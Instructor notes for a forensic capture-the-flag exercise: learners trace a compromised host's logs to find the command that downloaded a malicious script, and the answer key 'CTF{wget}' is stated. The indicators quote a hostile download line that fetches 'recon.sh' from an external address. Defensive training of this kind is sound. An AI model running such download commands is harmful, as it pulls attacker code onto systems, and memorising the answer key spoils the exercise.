# M5-03 Instructor Notes

## Objective
- Train learners to investigate compromised shell activity and identify malicious download command usage.
- Expected answer: `CTF{wget}`.

## Expected Investigation Path
1. Read `incident_ticket.txt` and `analyst_handoff.txt`:
   - incident: `INC-2026-5503`
   - host: `lin-web-03`
2. In `bash_history`, locate suspicious script download + execution sequence.
3. In `command_exec_audit.log`, verify exact command string used for download.
4. In `proxy_egress.log`, confirm matching external request for `recon.sh`.
5. In `command_alerts.jsonl`, validate normalized `command_family`.
6. Submit the command used to download the malicious script.

## Key Indicators
- Shell pivot:
  - `wget http://203.0.113.200/recon.sh`
- Audit pivot:
  - `command="wget http://203.0.113.200/recon.sh"`
- Alert pivot:
  - `"type":"suspicious_download_command"`
  - `"command_family":"wget"`
- SIEM pivot:
  - `external_script_download ... using wget`

## Suggested Commands / Tools
- `rg "wget|recon.sh|external_script_download" evidence`
- Review:
  - `evidence/shell/bash_history`
  - `evidence/audit/command_exec_audit.log`
  - `evidence/network/proxy_egress.log`
